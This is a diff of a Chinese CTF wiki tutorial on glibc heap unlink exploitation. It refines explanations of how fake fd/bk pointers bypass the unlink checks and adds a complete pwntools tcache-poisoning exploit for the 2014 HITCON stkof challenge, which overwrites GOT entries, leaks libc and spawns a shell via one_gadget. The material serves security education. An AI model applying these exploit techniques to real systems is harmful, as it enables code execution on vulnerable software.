@@ -8,7 +8,7 @@ typora-root-url: ../../../docs
 
 我们在利用 unlink 所造成的漏洞时，其实就是对进行 unlink chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。
 
-我们先来简单回顾一下 unlink 的目的与过程，其目的是把一个双向链表中的空闲块拿出来，然后和目前物理相邻的 free chunk 进行合并。其基本的过程如下
+我们先来简单回顾一下 unlink 的目的与过程，其目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下
 
 ![](./figure/unlink_smallbin_intro.png)
 
@@ -16,17 +16,17 @@ typora-root-url: ../../../docs
 
 ### 古老的 unlink
 
-在最初 unlink 实现的时候，其实是没有对双向链表检查的，也就是说，没有以下的代码。
+在最初 unlink 实现的时候，其实是没有对 chunk 的 size 检查和双向链表检查的，即没有如下检查代码。
 
 ```c
-// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
+// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)
 if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
       malloc_printerr ("corrupted size vs. prev_size");			      \
-// fd bk
+// 检查 fd 和 bk 指针(双向链表完整性检查)
 if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
   malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
 
-  // next_size related
+  // largebin 中 next_size 双向链表完整性检查 
               if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              \
                 || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
               malloc_printerr (check_action,                                      \
@@ -37,12 +37,12 @@ if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
 
 ![](./figure/old_unlink_vul.png)
 
-那么如果我们通过某种方式（**比如溢出**）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们free(Q)时
+现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（**比如溢出**）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们free(Q)时
 
-1.  glibc 判断这个块是 small chunk。
-2.  判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并。
-3.  判断后向合并，发现后一个 chunk 处于空闲状态，需要合并。
-4.  继而对 nextchunk 采取 unlink 操作。
+- glibc 判断这个块是 small chunk
+- 判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并
+- 判断后向合并，发现后一个 chunk 处于空闲状态，需要合并
+- 继而对 Nextchunk 采取 unlink 操作
 
 那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下
 
@@ -70,20 +70,30 @@ if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
 - FD->bk = target addr - 12 + 12=target_addr
 - BK->fd = expect value + 8
 
-那么我们上面所利用的修改 GOT 表项的方法就可能不可用了。但是，如果我们使得 expect value+8 以及 target_addr 等于 P，那么我们就可以执行
+那么我们上面所利用的修改 GOT 表项的方法就可能不可用了。但是我们可以通过伪造的方式绕过这个机制。
 
-- *P= expect value = P - 8
-- *P = target addr -12 = P - 12
+首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要
 
-即改写了指针 P 的内容，将其指向了比自己低 12 的地址处。
+- fakeFD->bk == P    <=>    *(fakeFD+12)== P
+- fakeBK->fd == P    <=>    *(fakeBK+8) == P
 
-而如果我们想要使得两者都指向 P，只需要按照如下方式修改即可
+当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：
+
+- fakeFD->bk=fakeBK    <=>    *(fakeFD+12)=fakeBK
+- fakeBK->fd=fakeFD    <=>    *(fakeBK+8)=fakeFD
+
+如果让 fakeFD+12 和 fakeBK+8 指向同一个指向P的指针，那么：
+
+- *P = P - 8
+- *P = P - 12
+
+即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。
+
+如果我们想要使得两者都指向 P，只需要按照如下方式修改即可
 
 ![](./figure/new_unlink_vul.png)
 
-我们会通过之后的例子来说明，我们这样的修改是可以达到一定的效果的。
-
-需要注意的是，这里我们并没有违背下面的约束。
+需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。
 
 ```c
     // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
@@ -94,6 +104,8 @@ if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
 **此外，其实如果我们设置next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果。**
 
 ## 2014 HITCON stkof
+
+[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof)
 
 ### 基本信息
 
@@ -113,18 +125,18 @@ stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
 
 ### 基本功能
 
-程序几乎啥输出也没有，只能硬看了，大概是一个内存分配器，差不多有四个功能
+程序存在 4 个功能，经过 IDA 分析后可以分析功能如下
 
-- 1，分配指定大小的内存，并在bss段记录对应 chunk 的指针，假设其为global。
-- 2，根据指定索引，以及指定大小向指定内存处，读入数据。**可见，这里存在堆溢出的情况，因为这里读入字节的大小是由我们来控制的。**
-- 3，根据指定索引，释放已经分配的内存块。
-- 4，这个功能并没有什么卵用，本来以为是可以输出内容，结果什么也没有输出。。
+- alloc：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 global
+- read_in：根据指定索引，向分配的内存处读入数据，数据长度可控，**这里存在堆溢出的情况**
+- free：根据指定索引，释放已经分配的内存块
+- useless：这个功能并没有什么卵用，本来以为是可以输出内容，结果什么也没有输出
 
-### 初步测试
+### IO 缓冲区问题分析
 
-值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为1024 和 1024。具体如下，可以进行调试查看
+值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。具体如下，可以进行调试查看
 
-初次调用 fgets 时，malloc会分配缓冲区 1024 大小。
+初次调用 fgets 时，malloc 会分配缓冲区 1024 大小。
 
 ```
 *RAX  0x0
@@ -425,9 +437,147 @@ if __name__ == "__main__":
 
 ```
 
+### tcache exploit
+
+本题可以溢出较长字节，因此可以覆盖 chunk 的 fd 指针，在 libc 2.26 之后的 tcache 机制中，未对 fd 指针指向的 chunk 进行 size 检查，从而可以将 fd 指针覆盖任意地址。在 free 该被溢出 chunk 并且两次 malloc 后可以实现任意地址修改：
+
+```python
+from pwn import *
+from GdbWrapper import GdbWrapper
+from one_gadget import generate_one_gadget
+
+context.log_level = "info"
+context.endian = "little"
+context.word_size = 64
+context.os = "linux"
+context.arch = "amd64"
+context.terminal = ["deepin-terminal", "-x", "zsh", "-c"]
+
+def Alloc(io, size):
+    io.sendline("1")
+    io.sendline(str(size))
+    io.readline()
+    io.readline()
+def Edit(io, index, length, buf):
+    io.sendline("2")
+    io.sendline(str(index))
+    io.sendline(str(length))
+    io.send(buf)
+    io.readline()
+def Free(io, index):
+    io.sendline("3")
+    io.sendline(str(index))
+    try:
+        tmp = io.readline(timeout = 3)
+    except Exception:
+        io.interactive()
+    print tmp
+    if "OK" not in tmp and "FAIL" not in tmp:
+        return tmp
+
+def main(binary, poc):
+    # test env
+    bss_ptrlist = None
+    free_index = None
+    free_try = 2
+    elf = ELF(binary)
+    libc_real = elf.libc.path[: elf.libc.path.rfind('/') + 1]
+
+    assert elf.arch == "amd64" and (os.path.exists(libc_real + "libc-2.27.so") or os.path.exists(libc_real + "libc-2.26.so"))
+    while bss_ptrlist == None:
+        # find bss ptr
+        io = process(binary)
+        gdbwrapper = GdbWrapper(io.pid)
+        # gdb.attach(io)
+        Alloc(io, 0x400)
+        Edit(io, 1, 0x400, "a" * 0x400)
+        Alloc(io, 0x400)
+        Edit(io, 2, 0x400, "b" * 0x400)
+        Alloc(io, 0x400)
+        Edit(io, 3, 0x400, "c" * 0x400)
+        Alloc(io, 0x400)
+        Edit(io, 4, 0x400, "d" * 0x400)
+        Alloc(io, 0x400)
+        Edit(io, 5, 0x400, "e" * 0x400)
+        heap = gdbwrapper.heap()
+        heap = [(k, heap[k]) for k in sorted(heap.keys())]
+        ptr_addr = []
+        index = 1
+        while True:
+            for chunk in heap:
+                address = chunk[0]
+                info = chunk[1]
+                ptr_addr_length = len(ptr_addr)
+                if (info["mchunk_size"] & 0xfffffffffffffffe) == 0x410:
+                    for x in gdbwrapper.search("bytes", str(chr(ord('a') + index - 1)) * 0x400):
+                        if int(address, 16) + 0x10 == x["ADDR"]:
+                            tmp = gdbwrapper.search("qword", x["ADDR"])
+                            for y in tmp:
+                                if binary.split("/")[-1] in y["PATH"]:
+                                    ptr_addr.append(y["ADDR"])
+                                    break
+                        if (len(ptr_addr) != ptr_addr_length):
+                            break
+                if len(ptr_addr) != ptr_addr_length:
+                    break
+            index += 1
+            if (index == 5):
+                break
+        bss_ptrlist = sorted(ptr_addr)[0]
+        io.close()
+    while free_index == None:
+        io = process(binary)
+        Alloc(io, 0x400)
+        Alloc(io, 0x400)
+        Alloc(io, 0x400)
+        Free(io, free_try)
+        Edit(io, free_try - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(0x12345678))
+        try:
+            Alloc(io, 0x400)
+            Alloc(io, 0x400)
+        except Exception:
+            free_index = free_try
+        free_try += 1
+        io.close()
+    # arbitrary write
+    libc = ELF(binary).libc
+    one_gadget_offsets = generate_one_gadget(libc.path)
+    for one_gadget_offset in one_gadget_offsets:
+        io = process(binary)
+        libc = elf.libc
+        gdbwrapper = GdbWrapper(io.pid)
+        Alloc(io, 0x400)
+        Alloc(io, 0x400)
+        Alloc(io, 0x400)
+        Free(io, free_index)
+        Edit(io, free_index - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(bss_ptrlist - 0x08))
+        Alloc(io, 0x400)
+        Alloc(io, 0x400)
+        ###leak libc
+        Edit(io, 5, 0x18, p64(elf.got["free"]) * 2 + p64(elf.got["malloc"]))
+        Edit(io, 0, 0x08, p64(elf.plt["puts"]))
+        leaked = u64(Free(io, 2)[:-1].ljust(8, "\x00"))
+        libc_base = leaked - libc.symbols["malloc"]
+        system_addr = libc_base + libc.symbols["system"]
+        one_gadget_addr = libc_base + one_gadget_offset
+        Edit(io, 1, 0x08, p64(one_gadget_addr))
+        Free(io, 1)
+        try:
+            io.sendline("id")
+            log.info(io.readline(timeout=3))
+        except Exception, e:
+            io.close()
+            continue
+        io.interactive()
+
+if __name__ == "__main__":
+    binary = "./bins/a679df07a8f3a8d590febad45336d031-stkof"
+    main(binary, "")
+```
 
 
 ## 2016 ZCTF note2
+[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2016_zctf_note2)
 
 ### 分析程序
 
@@ -522,7 +672,7 @@ def deletenote(id):
 
 #### 生成三个note
 
-这一部分对应的代码如下
+构造三个 chunk，chunk0、chunk1 和 chunk2
 
 ```python
 # chunk0: a fake chunk
@@ -538,12 +688,12 @@ newnote(0, 'a' * 8)
 newnote(0x80, 'b' * 16)
 ```
 
-其中这三个note的大小分别为0x80，0，0x80，第二个chunk虽然申请的大小为0，但是glibc的要求chunk块至少可以存储4个必要的字段(prev\_size,size,fd,bk)，所以会分配0x20的空间。同时，由于无符号整数的比较问题，可以为该note输入任意长的字符串。
+其中这三个 chunk 申请时的大小分别为0x80，0，0x80，chunk1 虽然申请的大小为0，但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段(prev\_size,size,fd,bk)，所以会分配 0x20 的空间。同时，由于无符号整数的比较问题，可以为该note输入任意长的字符串。
 
-这里需要注意的是，chunk1中一共构造了两个chunk
+这里需要注意的是，chunk0 中一共构造了两个 chunk
 
-- chunk ptr[0]，这个是为了unlink时修改对应的值。
-- chunk ptr[0]'s nextchunk，这个是为了使得unlink时的第一个检查满足。
+- chunk ptr[0]，这个是为了 unlink 时修改对应的值。
+- chunk ptr[0]'s nextchunk，这个是为了使得 unlink 时的第一个检查满足。
 
 ```c
     // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
@@ -592,7 +742,7 @@ fake ptr[0] chunk's nextchunk----->+-----------------+
                                            图1
 ```
 
-#### 释放chunk1-覆盖chunk2-释放chunk2
+#### 释放 chunk1-覆盖 chunk2-释放 chunk2
 
 对应的代码如下
 
@@ -606,7 +756,7 @@ newnote(0, content)
 deletenote(2)
 ```
 
-首先释放 chunk1，由于该chunk属于fastbin，所以下次在申请的时候仍然会申请到该chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖chunk3，覆盖之后如图2所示。
+首先释放 chunk1，由于该chunk属于fastbin，所以下次在申请的时候仍然会申请到该chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖chunk2，覆盖之后如图2所示。
 
 ```
                                    +-----------------+high addr
@@ -709,6 +859,7 @@ sh.interactive()
 此时如果我们再调用 atoi ，其实调用的就是 system 函数，所以就可以拿到shell了。
 
 ## 2017 insomni'hack wheelofrobots
+[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2017_insomni'hack_wheelofrobots)
 
 ### 基本信息
 
@@ -921,6 +1072,7 @@ if __name__ == "__main__":
 
 
 ## note3
+[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/ZCTF_2016_note3)
 
 ### 介绍
 
@@ -972,7 +1124,7 @@ int new()
 }
 ```
 
-所有的笔记malloc出来的指针存放在bss上全局数组bss_ptr中，这个数组最多可以存放7个heap_ptr。
+所有的笔记malloc出来的指针存放在bss上全局数组bss_ptr中，这个数组最多可以存放8个heap_ptr。
 而且heap_ptr对应的size也被放在bss_ptr数组中。current_ptr表示当前笔记，bss布局如下。
 
 ```
